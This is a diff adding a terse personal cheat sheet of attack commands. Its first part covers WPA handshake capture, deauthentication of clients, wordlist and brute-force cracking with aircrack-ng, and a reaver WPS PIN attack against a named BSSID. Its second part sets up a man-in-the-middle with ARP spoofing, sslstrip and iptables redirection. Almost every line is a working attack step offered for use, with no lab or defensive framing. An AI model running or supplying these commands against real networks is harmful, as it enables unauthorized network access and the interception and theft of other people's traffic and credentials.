@@ -1,0 +1,59 @@
+
+find wireless interface:
+ifconfig
+ifconfig INTERFACE down
+iwconfig INTERFACE mode monitor
+ifconfig INTERFACE up
+
+kill network manager, dhclient
+airmon-ng check wlan0
+
+# Listen to all
+airodump-ng INTERFACE
+
+# Listen to device
+airodump-ng -c CHANNEL -w outfile --bssid BSSID INTERFACE
+
+Deauthenticate devices..
+aireplay-ng -0 0 -a MAC_ADDRESS WIRELESS_INTEFACE
+
+# Then crack the handshake encryption.
+aircrack-ng -w wordlist capture.cap
+or bruteforce
+crunch MIN MAX GUESS | aircrack-ng -w - capture.cap -e INTERFACE
+
+# List networks (if lock is no happy hunting..)
+wash -i INTERFACE
+
+# Crack pin with reaver(use -r 2:60 for 2 attempts every minute..)
+reaver -b 0C:80:63:87:D4:AC -i wlan0 -c 7 -v --no-nacks -n
+
+# Change operating channel on network interface.
+iwconfig {interface} channel {channel} 
+
+
+
+---
+dnsiff
+sslstrip
+
+
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+# Open 8080 & Redirect routing for tcp packets on 80 to 8080
+iptables -I INPUT 1 -p tcp --dport 8080 -j ACCEPT
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
+iptables -t nat -L PREROUTING
+
+route 
+nmap 192.168.0.1-255 -vv
+
+arpspoof -i wlan0 -t {client} -r {default-gateway}
+
+-misc
+xhost si:localuser:tor
+
+
+apt-get install kali-linux-all
+apt-get install kali-desktop-gnome
+
